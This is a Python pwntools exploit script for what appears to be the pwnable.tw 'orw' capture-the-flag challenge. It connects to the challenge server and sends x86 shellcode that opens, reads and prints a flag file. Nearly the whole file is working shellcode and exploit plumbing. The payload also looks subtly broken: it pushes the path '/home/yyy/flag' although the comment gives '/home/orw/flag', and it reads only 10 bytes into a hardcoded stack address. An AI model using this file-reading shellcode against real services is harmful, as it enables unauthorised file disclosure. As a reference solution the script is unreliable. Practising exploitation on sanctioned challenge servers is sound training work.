#!/usr/bin/env python

from pwn import *


# /home/yyy/flag
        # push 0x006761
        # push 0x6c662f79
        # push 0x79792f65
        # push 0x6d6f682f

# /home/orw/flag
        # push 0x006761
        # push 0x6c662f77
        # push 0x726f2f65
        # push 0x6d6f682f

def main():
    conn = process("./orw")
    conn = remote("chall.pwnable.tw", 10001)

    payload = asm("""
        push 0x006761
        push 0x6c662f79
        push 0x79792f65
        push 0x6d6f682f
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        mov cl, 0x0
        mov ebx, esp
        mov al, 0x5
        int 0x80
        mov edx, 0xa
        push 0xffffbc48
        pop eax
        mov ecx, eax
        mov ebx, 0x3
        mov eax, 0x3
        int 0x80
        mov edx, 0xa
        push 0xffffbc48
        pop eax
        mov ebx, 0x1
        mov eax, 0x4
        int 0x80
    """)

    write("input.txt", payload)

    conn.sendline(payload)
    print conn.recvuntil("\n")


if __name__ == "__main__":
    main()
